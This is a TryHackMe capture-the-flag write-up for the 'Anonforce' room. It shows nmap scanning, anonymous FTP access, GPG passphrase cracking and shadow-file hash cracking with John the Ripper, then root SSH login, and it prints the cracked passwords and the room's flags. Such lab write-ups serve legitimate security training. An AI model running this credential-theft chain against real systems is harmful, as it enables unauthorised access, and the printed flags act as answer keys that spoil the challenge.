# TryHackMe - Anonforce Writeup

## Room Information

* **Room Name:** Anonforce
* **Difficulty:** Boot2Root
* **Platform:** TryHackMe
* **Objective:** Obtain both `user.txt` and `root.txt`

---

# Introduction

In this room, we discover an FTP service that allows anonymous login. Through FTP enumeration we find a user's home directory, a user flag, and some encrypted backup files.

The backup contains a GPG private key and an encrypted file. After cracking the passphrase protecting the private key, we decrypt the backup and obtain password hashes. Cracking those hashes gives us SSH access as root.

This writeup explains every step and command in detail.

---

# Step 1: Initial Nmap Scan

First, perform a full TCP port scan and service enumeration.

```bash
nmap -sV -sC -Pn -p- 10.49.167.128 -oN scan_results
```

## Command Explanation

| Option             | Description                                |
| ------------------ | ------------------------------------------ |
| `-sV`              | Detect service versions                    |
| `-sC`              | Run default NSE scripts                    |
| `-Pn`              | Skip host discovery (assume host is alive) |
| `-p-`              | Scan all 65535 TCP ports                   |
| `-oN scan_results` | Save output in normal format               |

---

## Scan Results

```text
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2
```

Interesting findings:

* Anonymous FTP login is enabled.
* SSH is available.

The Nmap script output also reveals:

```text
ftp-anon: Anonymous FTP login allowed
```

This is our initial attack vector.

---

# Step 2: Connect to FTP

Connect using anonymous authentication.

```bash
ftp 10.49.167.128
```

Username:

```text
anonymous
```

Password:

```text
anonymous
```

(or simply press Enter)

Successful login:

```text
230 Login successful.
```

---

# Step 3: Enumerate FTP Directories

List files:

```bash
ls
```

Output shows the entire filesystem exposed through FTP.

Important directories:

```text
/home
/notread
```

---

# Step 4: Find User Flag

Move into the home directory.

```bash
cd /home
ls
```

Output:

```text
melodias
```

Enter the user's directory:

```bash
cd melodias
ls
```

Output:

```text
user.txt
```

Download it:

```bash
get user.txt
```

Read the flag:

```bash
cat user.txt
```

Flag:

```text
606083fd33beb1284fc51f411a706af8
```

✅ User flag obtained.

---

# Step 5: Discover Interesting Files

Return to the root directory and inspect the writable folder.

```bash
cd ../..
cd notread
ls
```

Output:

```text
backup.pgp
private.asc
```

Download both files.

```bash
get backup.pgp
mget private.asc
```

Files obtained:

```text
backup.pgp
private.asc
```

---

# Understanding the Files

### private.asc

This is a GPG private key.

### backup.pgp

This is an encrypted file.

We need the private key and its passphrase to decrypt the backup.

---

# Step 6: Extract Hash From Private Key

Use John the Ripper's helper tool.

```bash
gpg2john private.asc > keyhash
```

## What This Does

`gpg2john` converts the encrypted GPG key into a format that John the Ripper can crack.

View the hash:

```bash
cat keyhash
```

---

# Step 7: Crack the GPG Passphrase

Use RockYou wordlist.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt keyhash
```

Result:

```text
xbox360
```

Password found:

```text
xbox360
```

---

# Step 8: Import the Private Key

Import the key into GPG.

```bash
gpg --import private.asc
```

Output:

```text
secret key imported
```

Now our system can use the private key.

---

# Step 9: Decrypt the Backup

Decrypt the encrypted file.

```bash
gpg --decrypt backup.pgp > shadow.bak
```

During decryption, enter the passphrase:

```text
xbox360
```

The backup reveals a Linux shadow file.

View contents:

```bash
cat shadow.bak
```

Important entries:

```text
root:$6$...
melodias:$1$...
```

These are password hashes.

---

# Step 10: Obtain passwd File

To crack Linux password hashes properly, we need the corresponding passwd file.

Reconnect to FTP.

```bash
ftp 10.49.167.128
```

Navigate to `/etc`.

```bash
cd /etc
```

Download passwd:

```bash
get passwd
```

Exit FTP.

---

# Step 11: Combine passwd and shadow

Use the `unshadow` utility.

```bash
unshadow passwd shadow.bak > unshadowed.txt
```

## What This Does

Linux stores account information in:

* `/etc/passwd`
* `/etc/shadow`

`unshadow` combines them into a format John can crack.

---

# Step 12: Crack Password Hashes

Run John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

Output:

```text
hikari (root)
```

Password found:

```text
hikari
```

Root password:

```text
hikari
```

---

# Step 13: SSH as Root

Connect through SSH.

```bash
ssh root@10.49.167.128
```

Enter password:

```text
hikari
```

Successful login:

```text
root@ubuntu:~#
```

We immediately obtain root access.

---

# Step 14: Capture Root Flag

List files:

```bash
ls
```

Output:

```text
root.txt
```

Read it:

```bash
cat root.txt
```

Flag:

```text
f706456440c7af4187810c31c6cebdce
```

✅ Root flag obtained.

---

# Attack Path Summary

```text
Nmap Scan
     |
Anonymous FTP Access
     |
Download user.txt
     |
Download private.asc
     |
Download backup.pgp
     |
Crack GPG Passphrase
     |
Import Private Key
     |
Decrypt backup.pgp
     |
Recover shadow File
     |
Download passwd
     |
Unshadow
     |
Crack Password Hashes
     |
Root Password Found
     |
SSH as Root
     |
Read root.txt
```

---

# Credentials and Flags

## GPG Passphrase

```text
xbox360
```

## Root Password

```text
hikari
```

## User Flag

```text
606083fd33beb1284fc51f411a706af8
```

## Root Flag

```text
f706456440c7af4187810c31c6cebdce
```

---

# Key Takeaways

1. Always check for anonymous FTP access.
2. Misconfigured FTP servers may expose sensitive files.
3. Encrypted backups are only as secure as their passphrases.
4. GPG keys can often be cracked using dictionary attacks.
5. Password hash backups can lead directly to privilege escalation.
6. Always secure backup files and private keys.

---

# Conclusion

The Anonforce machine demonstrates how a simple FTP misconfiguration can expose highly sensitive information. By downloading a private GPG key and encrypted backup, cracking the key's passphrase, decrypting the backup, and recovering password hashes, we were able to obtain the root password and gain full system access.

This room is an excellent beginner-level Boot2Root challenge for practicing:

* FTP Enumeration
* GPG Key Cracking
* Password Hash Cracking
* Linux Credential Recovery
* SSH Access
* Privilege Escalation through Credential Disclosure

Machine successfully rooted.
